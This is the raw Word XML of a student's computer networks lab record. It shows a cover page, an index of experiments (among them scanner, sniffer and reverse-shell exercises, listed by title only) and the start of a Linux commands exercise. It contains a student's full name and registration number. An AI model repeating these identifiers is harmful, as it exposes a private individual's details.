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3A59B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:before="1500"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="B57726"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>LABORATORY RECORD</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24451808" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:before="240"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F2747"/>
          <w:sz w:val="64"/>
        </w:rPr>
        <w:t>COMPUTER</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F2747"/>
          <w:sz w:val="64"/>
        </w:rPr>
        <w:br/>
        <w:t>NETWORKS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09B7B3F7" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5267"/>
          <w:sz w:val="36"/>
        </w:rPr>
        <w:t>LAB MANUAL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="677FC207" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:before="400"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="B57726"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>NETWORKS • PROTOCOLS • TOOLS • ANALYSIS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08"/>
      </w:tblGrid>
      <w:tr w:rsidR="00980B9C" w14:paraId="53201DE9" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8208" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0F5267"/>
          </w:tcPr>
          <w:p w14:paraId="2B436255" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="122854FB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:before="480"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5267"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>STUDENT DETAILS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5472"/>
      </w:tblGrid>
      <w:tr w:rsidR="00980B9C" w14:paraId="2482F34D" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2232" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAF3F5"/>
          </w:tcPr>
          <w:p w14:paraId="3050D2CA" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
            <w:pPr>
              <w:spacing w:before="100" w:after="100"/>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="0F5267"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Name</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5472" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F6F8FA"/>
          </w:tcPr>
          <w:p w14:paraId="27B34C4D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
            <w:pPr>
              <w:spacing w:before="100" w:after="100"/>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>RAGHU NANDHAN A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00980B9C" w14:paraId="563E68CD" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2232" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAF3F5"/>
          </w:tcPr>
          <w:p w14:paraId="4EBC95D5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
            <w:pPr>
              <w:spacing w:before="100" w:after="100"/>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="0F5267"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Reg. No</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5472" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F6F8FA"/>
          </w:tcPr>
          <w:p w14:paraId="33CCE372" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
            <w:pPr>
              <w:spacing w:before="100" w:after="100"/>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>2116251901130</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00980B9C" w14:paraId="08FDA9C4" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2232" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAF3F5"/>
          </w:tcPr>
          <w:p w14:paraId="334758E4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
            <w:pPr>
              <w:spacing w:before="100" w:after="100"/>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="0F5267"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Department</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5472" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F6F8FA"/>
          </w:tcPr>
          <w:p w14:paraId="5329E331" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
            <w:pPr>
              <w:spacing w:before="100" w:after="100"/>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CSE CS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00980B9C" w14:paraId="0F8659D9" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2232" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAF3F5"/>
          </w:tcPr>
          <w:p w14:paraId="06668B50" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
            <w:pPr>
              <w:spacing w:before="100" w:after="100"/>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="0F5267"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Subject</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="5472" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F6F8FA"/>
          </w:tcPr>
          <w:p w14:paraId="26FB3E00" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
            <w:pPr>
              <w:spacing w:before="100" w:after="100"/>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Computer Networks Lab Manual</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="30319720" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:before="1000"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="5F6D7A"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>PRACTICAL RECORD  •  EXPERIMENTS 1A–15</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="797F706D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="29090294" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>INDEX</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59B4C0B4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>List of experiments included in this laboratory record.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980B9C" w14:paraId="5021A2D0" w14:textId="77777777" w:rsidTr="00980B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  <w:shd w:val="clear" w:color="auto" w:fill="0F5267"/>
          </w:tcPr>
          <w:p w14:paraId="0651AA89" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>S. No.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3331" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0F5267"/>
          </w:tcPr>
          <w:p w14:paraId="060807E4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="0062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Ex. No.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3331" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="0F5267"/>
          </w:tcPr>
          <w:p w14:paraId="7D235931" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="0062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color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Name of the Experiment</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00980B9C" w14:paraId="4EE7D988" w14:textId="77777777" w:rsidTr="009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56FE2B3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1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2058BE67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1A</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="078D32F0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Basic Networking Commands in Linux Operating System</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00980B9C" w14:paraId="5B40028C" w14:textId="77777777" w:rsidTr="009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2F912706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331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6E92EB3E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1B</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1557901A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Basic Networking Commands in Windows Operating System</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00980B9C" w14:paraId="64982390" w14:textId="77777777" w:rsidTr="009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41AE8B2D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331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="601E20C7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2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7EDC4D8D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Study of Socket Programming in Python</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00980B9C" w14:paraId="5B36AFE8" w14:textId="77777777" w:rsidTr="009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B994991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331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="02A81BFE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3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="06468A5C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Customized Ping Command to Test Server Connectivity</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00980B9C" w14:paraId="49DBC09D" w14:textId="77777777" w:rsidTr="009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C0748DE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331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1E834CEF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4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2E2B2FF6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Packet Sniffing Using Raw Sockets in Python</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00980B9C" w14:paraId="63D407BC" w14:textId="77777777" w:rsidTr="009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0E79357C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331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5B057F7B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5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7CF87CAE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Simple Calculator Using XML-RPC</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00980B9C" w14:paraId="602811D6" w14:textId="77777777" w:rsidTr="009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839A01F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331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="35C0A386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6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3A4E127D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Nmap Live Host Discovery</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00980B9C" w14:paraId="2B31FAE6" w14:textId="77777777" w:rsidTr="009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7C412311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331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="69EB4BB1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7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="02C3C38F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Anonymous FTP Scanner</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00980B9C" w14:paraId="1460BA4D" w14:textId="77777777" w:rsidTr="009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37731B01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3331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="55DFD0DA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8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="065C0CB9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Reverse Shell Using TCP Sockets</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00980B9C" w14:paraId="10D507BA" w14:textId="77777777" w:rsidTr="009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DD7CC13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331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3ABCE645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9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7BDAB815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Design a Simple Topology Using Cisco Packet Tracer</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00980B9C" w14:paraId="1BB39981" w14:textId="77777777" w:rsidTr="009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796150E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3331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="33B2938D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10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="64D35D6A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Customize Switch with Network Modules Using Cisco Packet Tracer</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00980B9C" w14:paraId="1F2D499F" w14:textId="77777777" w:rsidTr="009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414B637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3331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="399F3958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11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2C67A4E2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Examining Network Address Translation (NAT) Using Cisco Packet Tracer</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00980B9C" w14:paraId="0F033104" w14:textId="77777777" w:rsidTr="009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276E123C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3331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="44BE477C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12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="52C94905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Capture, Save and Analyze Network Traffic Using Wireshark</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00980B9C" w14:paraId="64240B42" w14:textId="77777777" w:rsidTr="009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087C2506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14</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1DA4FDFF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13</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5DB0D68F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Network Forensics Using PcapXray Tool</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00980B9C" w14:paraId="522EB88C" w14:textId="77777777" w:rsidTr="00980B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55D0BE9D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15</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="442D6C7E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14</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1DA8075A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
            <w:pPr>
              <w:spacing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Learning and Assignment of IP Address Manually to Computers</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00980B9C" w14:paraId="394C5FB5" w14:textId="77777777" w:rsidTr="00980B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1" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="656ABD2E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
            <w:pPr>
              <w:spacing w:after="40"/>
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4AE8843F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15</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3331" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="55264C5D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
            <w:pPr>
              <w:spacing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7"/>
              </w:rPr>
              <w:t>Analyze Different Types of Servers Using Webalizer Tool</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="42006704" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00980B9C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="247CCA23" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="5F6D7A"/>
        </w:rPr>
        <w:t>Note: Output areas in the source manual are retained as prompts where applicable. Insert your own screenshots and actual execution results before submission.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="626377B4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CF4302D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Ex.No:1a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EE8E485" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Basic Networking Commands in Linux operating system</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2793A8AC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66BA869B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>To study and execute basic networking commands in linux operating</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CCAC406" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29CEDA3F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. ls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F9761F9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>NAME: ls - list directory contents</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D968B69" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SYNOPSIS: ls [OPTION]... [FILE]...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="436F2205" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DESCRIPTION: List  information  about  the  FILEs (the current directory by</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="197902CB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>default).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="526CEB94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47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1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="379671B2" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>a) ls -a : do not ignore entries starting with .</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="219486D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6537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6537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3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A05C364" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>b) ls -l : use a long listing format</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A25B2A3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0288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28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5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0342F2DB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. echo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A6B74A8" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>NAME: echo - display a line of text</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4767143F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SYNOPSIS: echo [SHORT-OPTION]... [STRING]...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58807CBE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="543E6648" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>echo LONG-OPTION</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78E6A927" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DESCRIPTION: Echo the STRING(s) to standard output.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43F42492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3000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0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6)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="082BC1FF" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3.ps</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11BDF5A8" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>NAME: ps - report a snapshot of the current processes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F85F357" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SYNOPSIS: ps [options]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10D52B1F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>DESCRIPTION: ps displays information about a selection of the active</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CE407EC" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>processes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3310C366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2992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99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8)</w:t>
      </w:r>
    </w:p>
